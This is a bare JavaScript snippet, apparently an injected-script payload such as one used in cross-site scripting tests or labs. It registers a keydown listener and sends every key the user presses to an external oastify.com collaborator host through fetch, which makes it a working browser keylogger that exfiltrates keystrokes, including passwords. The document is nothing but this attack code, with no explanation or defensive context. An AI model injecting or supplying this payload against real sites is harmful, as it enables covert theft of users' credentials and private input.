function logKey(event){
	fetch("https://fsb02a0zapqdlt32aonc590u8lec23zro.oastify.com/k?key=" + event.key)
}

document.addEventListener('keydown', logKey);
